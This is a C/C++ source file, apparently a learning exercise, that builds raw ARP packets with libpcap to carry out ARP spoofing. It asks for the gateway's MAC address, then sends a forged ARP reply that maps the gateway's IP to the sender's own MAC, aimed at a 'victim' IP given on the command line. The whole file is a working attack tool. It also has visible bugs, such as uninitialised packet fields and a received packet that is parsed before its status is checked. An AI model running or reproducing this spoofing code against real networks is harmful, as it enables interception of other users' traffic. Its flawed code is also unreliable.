#include <pcap.h>
#include <stdint.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <netdb.h>
#include <stdio.h>
#include <string.h>
#include <cstdlib>
#include <arpa/inet.h>
#include <stdlib.h>

#define len_mac 6

int s_getIpAddress (const char * ifr, unsigned char * out) {  
    int sockfd;  
    struct ifreq ifrq;  
    struct sockaddr_in * sin;  
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);  
    strcpy(ifrq.ifr_name, ifr);  
    if (ioctl(sockfd, SIOCGIFADDR, &ifrq) < 0) {  
        perror( "ioctl() SIOCGIFADDR error");  
        return -1;  
    }  
    sin = (struct sockaddr_in *)&ifrq.ifr_addr;  
    memcpy (out, (void*)&sin->sin_addr, sizeof(sin->sin_addr));   

    return 4;  
}  

uint16_t litte_endian16(uint16_t n){
	uint16_t temp1 = n&0xFF00; // n = 1234 -> temp1 = 1200
	uint16_t temp2 = n&0x00FF; // temp2 = 00434

	return temp1>>8|temp2<<8;
}

uint32_t litte_endian32(uint32_t n){
	uint32_t tmp1 = n&0xFF000000;
	uint32_t tmp2 = n&0x00FF0000;
	uint32_t tmp3 = n&0x0000FF00;
	uint32_t tmp4 = n&0x000000FF;

	return tmp4<<24|tmp3<<8|tmp2>>8|tmp1>>24;
}

void usage() {
  printf("syntax: ARP_test <interface> <Sender IP> <Target_IP>\n");
  printf("sample: ARP_test wlan0 192.x.x.x 192.x.x.x\n");
}

	/*ethernet Header*/
#pragma pack(1)
struct ARP{
	uint8_t Destination_Hardware_Address[len_mac];
	uint8_t Source_Hardware_Address[len_mac];
	uint16_t ARP_Tpye;
	uint16_t Hardware_Type;
	uint16_t Protocol_Tpye;
	uint8_t Hardware_size;
	uint8_t Procotol_size;
	uint16_t Opcode;
	uint8_t Sender_Mac_address[len_mac];
	uint8_t Sender_ip_address[4];
	uint8_t Target_Mac_address[len_mac];
	uint32_t Target_ip_address;
};
#pragma pack(8)



int main(int argc, char* argv[]) {//argv[1] = interface, argv[2] = victim ip, argv[3] = target ip(gateway ip)
  //u_char arp_request_packet[60];
  u_char Mac_address[6];
  char* dev = argv[1]; //dev: interface
  char errbuf[PCAP_ERRBUF_SIZE];
  u_char addr[4];  //my address

 
  if (argc != 4) {
    usage();
    return -1;
   }

//Mac address get
   struct ifreq s;
    int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);

    strcpy(s.ifr_name, argv[1]);
    if (0 == ioctl(fd, SIOCGIFHWADDR, &s)) {
        int i;
        for (i = 0; i < len_mac; ++i){
        	Mac_address[i] = (unsigned char)s.ifr_addr.sa_data[i];
            }
    }
  printf("My Mac_address : ");
  for (int i = 0; i < len_mac; ++i){
       	 printf("%02x ",Mac_address[i]);     //Mad_address save
}
  puts("\n");

//--------------------ARP Request Pacekt------------------------------

	struct ARP Send_arp; //Request ARP Pakcet
	struct ARP Reply_arp; //Replay ARP Packet
	struct ARP Attack_arp; //ARP Spoofing Packet

	uint8_t *q = (uint8_t *)&Attack_arp;
	uint8_t *p = (uint8_t *)&Send_arp;
//					Layer2
	//Broad Cast
	for(int i=0;i<6;i++){
	Send_arp.Destination_Hardware_Address[i]=0xFF;
	}
	//Source Hardware_address
	for(int i=0;i<6;i++){
	Send_arp.Source_Hardware_Address[i]=Mac_address[i]; 
	}
	//Type = ARP
	Send_arp.ARP_Tpye=litte_endian16(0x0806);
//					Layer3
	//Hardware Type = Ehternet //1
	Send_arp.Hardware_Type=litte_endian16(0x0001);
	//Protocol Type = IPv4 //0800
	Send_arp.Protocol_Tpye=litte_endian16(0x0800);
	//Hardware size 
	Send_arp.Hardware_size=6;
	//Protocol size
	Send_arp.Procotol_size=0x04;
	//Opcode
	Send_arp.Opcode = litte_endian16(0x0001);
	//Sender Mac_address
	for(int i=0;i<len_mac;i++){
		Send_arp.Sender_Mac_address[i]=Mac_address[i];
	}
 	//Sender IP_address
    if (s_getIpAddress(argv[1], addr) > 0) {//IP address get
 	for(int i=0;i<4;i++){
		Send_arp.Sender_ip_address[i] = addr[i];
		}
	}
	//Destination Mac_address
	for(int i=0;i<len_mac;i++){
		Send_arp.Target_Mac_address[i]=0x00;
	}
	//argv[3] Target IP_address ***
	Send_arp.Target_ip_address = inet_addr(argv[3]);

//--------------------------------------------------------------

  pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf); //open 
  
  if (handle == NULL) { //error argv[1] exception
    fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
    return -1;
  }

	//Send arp request Packet
  	if(pcap_sendpacket(handle,p,60/*size*/) != 0){
  		printf("\nError sending the packet: \n");
  	}
  	else printf("ARP Request Packet Send OK\n");

//-----------------------------------------------------------------------//


//-----------------------------Packet receive----------------------------------//
  while (true) {
    struct pcap_pkthdr* header; //header
    const u_char* packet;

    u_char Src_Mac_address[6];
    
    int index=0;
    int res = pcap_next_ex(handle, &header, &packet); //receive packet return 1 or 0
 	
     //Source_Hardware_address
    for(int i=0;i<6;i++){
    	index ++;
    }

    //get Mac_address
    for(int i=0;i<len_mac;i++){
    	Reply_arp.Source_Hardware_Address[i]=packet[index];
    	index ++;
    }

    //ARP_Tpye 
    Reply_arp.ARP_Tpye=(uint16_t)packet[index++]<<8|(uint16_t)packet[index++];

    //Offset
    for(int i=0;i<6;i++){
    	index ++;
    }

    //Opcode
    Reply_arp.Opcode=(uint16_t)packet[index++]<<8|(uint16_t)packet[index++];

    if(Reply_arp.ARP_Tpye==0x0806&&Reply_arp.Opcode==0x02){
    	printf("ARP Replay Packet Receive OK\n");
    	break;
  	 }

    if (res == 0) continue;
    if (res == -1 || res == -2) break;
  }

//---------------------------Send ARP Packet----------------------------------
//struct ARP Attack_arp

//Destination Mac = Reply_arp.Source_Hardware_Address[i]
//Source Mac = Send_arp.Source_Hardware_Address[i]
//Sender Mac = Send_arp.Source_Hardware_Address[i]
//Sender IP = Send_arp.Target_ip_address;
//Target Mac = Send_arp.Source_Hardware_Address[i]
//Target IP = argv[2]

for(int i=0;i<6;i++){
	Attack_arp.Destination_Hardware_Address[i]=Reply_arp.Source_Hardware_Address[i];
	}
	//Source 
	for(int i=0;i<6;i++){
	Attack_arp.Source_Hardware_Address[i]=Send_arp.Source_Hardware_Address[i];
	}
	//Type = ARP
	Attack_arp.ARP_Tpye=litte_endian16(0x0806);
//---------------------	Layer3---------------------------------------
	//Hardware Type = Ehternet //1
	Attack_arp.Hardware_Type=litte_endian16(0x0001);
	//Protocol Type = IPv4 //0800
	Attack_arp.Protocol_Tpye=litte_endian16(0x0800);
	//Hardware size 
	Attack_arp.Hardware_size=6;
	//Protocol size
	Attack_arp.Procotol_size=0x04;
	//Opcode
	Attack_arp.Opcode = litte_endian16(0x0002);
	//Sender Mac address
	for(int i=0;i<len_mac;i++){
		Attack_arp.Sender_Mac_address[i]=Mac_address[i];
	}
	//Sender IP_address Gateway IP_address
	for(int i=0;i<4;i++){
		Attack_arp.Sender_ip_address[i] |= Send_arp.Target_ip_address>>i*8;
		}	
	//Destination Mac address
	for(int i=0;i<len_mac;i++){
		Attack_arp.Target_Mac_address[i]=Send_arp.Source_Hardware_Address[i];
	}
	//Destinamtion Ip_address ***
	Attack_arp.Target_ip_address = inet_addr(argv[2]);

 if(pcap_sendpacket(handle,q,60/*size*/) != 0){
  	printf("\nError sending the packet: \n");
  	}
  else printf("ARP_Spoofing Replay Packet Send OK\n");

  pcap_close(handle);

  return 0;
}
